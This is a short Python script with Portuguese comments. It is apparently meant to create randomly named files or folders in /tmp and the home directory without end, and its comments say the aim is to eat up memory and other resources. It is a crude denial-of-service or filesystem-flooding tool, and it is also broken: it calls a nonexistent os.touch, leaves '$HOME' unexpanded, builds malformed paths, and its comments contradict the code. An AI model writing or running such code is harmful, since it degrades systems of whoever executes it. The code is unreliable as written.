import random
import string
import os
import uuid

# Função que gera os nomes aleatorios
def my_random_string(string_length=10):
    random = str(uuid.uuid4()) # Converte o formato uuid para uma string python
    random = random.upper() # Deixa todas letras em CAPS
    random = random.replace("-","") # Remove a tecla "-"
    return random[0:string_length] # RETORNA UMA STR ALEATORIA

pasta = my_random_string(50) # CRIA PALAVRAS COM 50 CARACTERES

while True:
    # ELE VAI CRIAR PASTAS SEM PARAR EM DOIS DIRETORIOS, PARA CONSUMIR MAIS A MEMORIA RAM 
    # É POSSIVEL ADICIONAR MAIS DIRETORIOS
    #
    # DIRETORIO DAS PASTAS
    os.touch(f'/tmp/\\{pasta}')
    pasta = my_random_string(50)
    # SEGUNDO DIRETORIO DAS PASTAS
    os.touch(f'$HOME\\{pasta}')
    pasta = my_random_string(50)
    



